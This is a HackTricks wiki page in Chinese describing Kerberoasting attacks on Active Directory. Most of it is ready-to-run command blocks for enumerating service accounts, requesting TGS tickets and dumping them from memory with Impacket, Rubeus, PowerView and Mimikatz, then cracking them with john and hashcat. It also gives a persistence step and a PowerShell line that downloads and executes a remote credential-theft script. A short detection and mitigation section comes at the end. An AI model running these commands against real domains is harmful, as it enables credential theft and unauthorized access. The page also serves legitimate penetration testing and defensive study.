# Kerberoast

![](<../../.gitbook/assets/image (9) (1) (2).png>)

\
使用[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)可以轻松构建和自动化由全球最先进的社区工具提供支持的工作流程。\
立即获取访问权限：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想要**获取最新版本的PEASS或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。

</details>

## Kerberoast

**Kerberoasting**的目标是收集在AD中代表用户账户运行的服务的**TGS票据**，而不是计算机账户。因此，这些TGS票据的**一部分**是使用从用户密码派生的密钥进行**加密**的。因此，它们的凭据可以**离线破解**。\
你可以通过属性**"ServicePrincipalName"**是否为**非空**来判断一个**用户账户**是否被用作**服务**。

因此，要执行Kerberoasting，只需要一个可以请求TGS的域账户，这可以是任何人，因为不需要特殊权限。

**你需要在域内拥有有效的凭据。**

### **攻击**

{% hint style="warning" %}
**Kerberoasting工具**通常在执行攻击和发起TGS-REQ请求时请求**`RC4加密`**。这是因为**RC4** [**更弱**](https://www.stigviewer.com/stig/windows\_10/2017-04-28/finding/V-63795)，并且比其他加密算法（如AES-128和AES-256）更容易使用Hashcat等工具进行离线破解。\
RC4（类型23）哈希以**`$krb5tgs$23$*`**开头，而AES-256（类型18）以**`$krb5tgs$18$*`**开头。
{% endhint %}

#### **Linux**
```bash
# Metasploit framework
msf> use auxiliary/gather/get_user_spns
# Impacket
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast # Password will be prompted
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
# kerberoast: https://github.com/skelsec/kerberoast
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. Enumerate kerberoastable users
kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. Dump hashes
```
多功能工具，包括可进行kerberoast攻击的用户信息转储：
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN.FULL> -ip <DC_IP> -u <USERNAME> -p <PASSWORD> -c
```
#### Windows

* **枚举可进行Kerberoast攻击的用户**
```powershell
# Get Kerberoastable users
setspn.exe -Q */* #This is a built-in binary. Focus on user accounts
Get-NetUser -SPN | select serviceprincipalname #Powerview
.\Rubeus.exe kerberoast /stats
```
* **技术1：请求TGS并从内存中转储**
```powershell
#Get TGS in memory from a single user
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Example: MSSQLSvc/mgmt.domain.local

#Get TGSs for ALL kerberoastable accounts (PCs included, not really smart)
setspn.exe -T DOMAIN_NAME.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

#List kerberos tickets in memory
klist

# Extract them from memory
Invoke-Mimikatz -Command '"kerberos::list /export"' #Export tickets to current folder

# Transform kirbi ticket to john
python2.7 kirbi2john.py sqldev.kirbi
# Transform john to hashcat
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```
* **技术2：自动化工具**

Automatic tools can greatly simplify the process of kerberoasting. These tools automate the enumeration of vulnerable user accounts and the extraction of their Kerberos Service Tickets (TGS). Here are some popular tools that can be used for kerberoasting:

- [Rubeus](https://github.com/GhostPack/Rubeus): A powerful tool that can be used to perform various Kerberos attacks, including kerberoasting.
- [Kekeo](https://github.com/gentilkiwi/kekeo): Another versatile tool that can be used to perform Kerberos-related attacks, including kerberoasting.
- [Impacket](https://github.com/SecureAuthCorp/impacket): A collection of Python scripts that can be used to interact with the Kerberos protocol, including kerberoasting.
- [Mimikatz](https://github.com/gentilkiwi/mimikatz): A popular tool that can be used to extract Kerberos tickets, including TGS tickets for kerberoasting.

These tools typically provide options to specify the target domain, user accounts, and output format. They can also automate the cracking of extracted TGS tickets using dictionary or brute-force attacks. It is important to note that the use of these tools should be done responsibly and with proper authorization.
```bash
# Powerview: Get Kerberoast hash of a user
Request-SPNTicket -SPN "<SPN>" -Format Hashcat #Using PowerView Ex: MSSQLSvc/mgmt.domain.local
# Powerview: Get all Kerberoast hashes
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast #Specific user
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap #Get of admins

# Invoke-Kerberoast
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
```
{% hint style="warning" %}
当请求TGS时，Windows事件`4769 - 请求了一个Kerberos服务票据`会被生成。
{% endhint %}



![](<../../.gitbook/assets/image (9) (1) (2).png>)

\
使用[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)轻松构建和**自动化工作流程**，利用全球**最先进**的社区工具。\
立即获取访问权限：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

### 破解
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### 持久性

如果您对用户拥有足够的权限，您可以使其成为**可进行Kerberoasting攻击的目标**：
```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
```
您可以在这里找到有用的**工具**进行**kerberoast**攻击：[https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)

如果您在Linux上遇到以下**错误**：**`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`**，这是因为您的本地时间与域控制器不同步。有几种解决方法：
- `ntpdate <域控制器的IP>` - 在Ubuntu 16.04之后已弃用
- `rdate -n <域控制器的IP>`

### 缓解措施

如果可利用，Kerberoast非常隐蔽

* 安全事件ID 4769 - 请求了一个Kerberos票证
* 由于4769非常频繁，让我们过滤结果：
* 服务名称不应为krbtgt
* 服务名称不以$结尾（用于过滤用于服务的机器账户）
* 帐户名称不应为machine@domain（用于过滤来自机器的请求）
* 失败代码为'0x0'（用于过滤失败，0x0表示成功）
* 最重要的是，票证加密类型为0x17
* 缓解措施：
* 服务账户密码应难以猜测（超过25个字符）
* 使用托管服务账户（定期自动更改密码和委派SPN管理）
```bash
Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
```
**在ired.team上关于Kerberoasting的更多信息**[**在这里**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)**和**[**在这里**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)**。**

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 YouTube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)或**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。

</details>

![](<../../.gitbook/assets/image (9) (1) (2).png>)

\
使用[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)可以轻松构建和**自动化工作流程**，使用全球**最先进的**社区工具。\
立即获取访问权限：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
